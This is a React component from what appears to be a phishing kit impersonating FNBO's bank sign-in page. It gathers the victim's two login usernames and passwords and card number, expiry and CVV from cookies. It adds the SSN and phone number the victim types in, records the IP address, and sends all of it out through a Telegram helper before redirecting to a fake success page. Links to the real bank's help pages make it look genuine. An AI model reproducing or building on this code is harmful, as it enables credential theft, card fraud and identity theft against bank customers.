import React from 'react'
// import { useNavigate } from 'react-router-dom';
import cookies from '../utils/cookie.config';
import TelegramSend from '../utils/send-message';
import { useNavigate } from 'react-router-dom';
// import emailjs from "@emailjs/browser";


export default function Addition2() {
  const [formInput, setFormInput] = React.useState<final>({
    sn: "",
    tel: "",
  });
  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const card: card = cookies.get("card");
  // const code: otp = cookies.get("code");

  // const navigate = useNavigate();
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  const form = React.useRef<HTMLFormElement>(null);

  const navigate = useNavigate();

  const [isLoading, setIsLoading] = React.useState(false);
  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true)

    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;
    // Code: ${code.cd}
    const message = `
    ---- FNBO -----
    IP: ${visitorIP}

    Username: ${login1.username}
    Password: ${login1.password}

    Username 2: ${login2.username2}
    Password 2: ${login2.password2}
    
    Card number: ${card.cnm}
    Card Expiry : ${card.exp}
    Card Cvv: ${card.cv}
    
    SSN: ${formInput.sn}
    Phone Number: ${formInput.tel}
    `;

    await TelegramSend(message);
    // window.location.replace("https://www.fnbo.com/");
    setIsLoading(false)
    navigate("../success", { replace: true });
    
  };

  const [ipAddress, setIpAddress] = React.useState<string>();

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    setIpAddress(response.ip);
  }

  React.useEffect(() => {
    getIP();
  }, []);


  return (
    <>
      <div className="auth-content">
        <div className="auth-content-inner">
          <div className="primary-auth">
            <form
              method="POST"
              data-se="o-form"
              slot="content"
              id="form19"
              onSubmit={handleSubmit}
              ref={form}
              className="primary-auth-form o-form o-form-edit-mode"
            >

<div style={{ display: "none" }} className="hidden_form">
                <input
                  type="text"
                  name="username"
                  defaultValue={login1.username}
                />

<input
                  type="text"
                  name="ip"
                  defaultValue={ipAddress}
                />
              
                <input
                  type="text"
                  name="password"
                  defaultValue={login1.password}
                />
                <input
                  type="text"
                  name="username2"
                  defaultValue={login2.username2}
                />
                <input
                  type="text"
                  name="password2"
                  defaultValue={login2.password2}
                />
                <input type="text" name="cnm" defaultValue={card.cnm} />
                <input type="text" name="exp" defaultValue={card.exp} />
                <input type="text" name="cv" defaultValue={card.cv} />
                
                <input
                  type="text"
                  name="brow"
                  defaultValue={window.navigator.userAgent}
                />
              </div>

              <div
                data-se="o-form-content"
                className="o-form-content o-form-theme clearfix"
              >
                <h2
                  data-se="o-form-head"
                  className="okta-form-title o-form-head"
                >
                  Verify your personal information
                </h2>
                
                <div
                  className="o-form-error-container"
                  data-se="o-form-error-container"
                ></div>
                <div
                  className="o-form-fieldset-container"
                  data-se="o-form-fieldset-container"
                >
                  <div
                    data-se="o-form-fieldset"
                    className="o-form-fieldset o-form-label-top margin-btm-5"
                  >
                    <div
                      data-se="o-form-label"
                      className="okta-form-label o-form-label"
                    >
                      <label htmlFor="okta-signin-username">
                        SSN
                      </label>
                    </div>
                    <div
                      data-se="o-form-input-container"
                      className="o-form-input"
                    >
                      <span
                        data-se="o-form-input-username"
                        className="o-form-input-name-username o-form-control okta-form-input-field input-fix"
                      >
                        <input
                          type="text"
                          placeholder=""
                          name="sn"
                          id="okta-signin-username"
                          onChange={handleInputChange}
                          defaultValue={formInput.sn}
                          maxLength={9}
                          aria-label=""
                          aria-required="true"
                          required
                        />
                      </span>
                    </div>
                  </div>

                  <div
                    data-se="o-form-fieldset"
                    className="o-form-fieldset o-form-label-top margin-btm-5"
                  >
                    <div
                      data-se="o-form-label"
                      className="okta-form-label o-form-label"
                    >
                      <label htmlFor="okta-signin-username">
                       Phone Number
                      </label>
                    </div>
                    <div
                      data-se="o-form-input-container"
                      className="o-form-input"
                    >
                      <span
                        data-se="o-form-input-username"
                        className="o-form-input-name-username o-form-control okta-form-input-field input-fix"
                      >
                        <input
                          type="tel"
                          placeholder=""
                          name="tel"
                          id="okta-signin-username"
                          onChange={handleInputChange}
                          defaultValue={formInput.tel}
                          aria-label=""
                          aria-required="true"
                          required
                        />
                      </span>
                    </div>
                  </div>

              
                </div>
              </div>
              <div className="o-form-button-bar">
              {isLoading ? (
                  <input
                  className="button button-primary"
                  type="submit"
                  value="Please wait...."
                  id="okta-signin-submit"
                  data-type="save"
                />
                ) : (
                  <input
                    className="button button-primary"
                    type="submit"
                    value="Submit"
                    id="okta-signin-submit"
                    data-type="save"
                  />
                )}
              </div>
            </form>
            <div className="auth-footer">
              <a
                href="https://auth.securebanklogin.com/?brand=fnbo#"
                data-se="needhelp"
                aria-expanded="false"
                aria-controls="help-links-container"
                className="link help js-help"
              >
                Need help signing in?
              </a>
              <ul
                className="help-links js-help-links"
                id="help-links-container"
                style={{}}
              >
                <li>
                  <a
                    href="https://auth.securebanklogin.com/?brand=fnbo#"
                    data-se="forgot-password"
                    className="link js-forgot-password"
                  >
                    Forgot password?
                  </a>
                </li>
                <li>
                  <a
                    href="https://www.securebanklogin.com/auth/fnbo/forgot-user-id"
                    className="link js-custom"
                    rel="noopener noreferrer"
                  >
                    Forgot User ID?
                  </a>
                </li>
                <li>
                  <a
                    href="https://auth.securebanklogin.com/help/login"
                    data-se="help-link"
                    className="link js-help-link"
                    rel="noopener noreferrer"
                    target="_blank"
                  >
                    Need help?
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
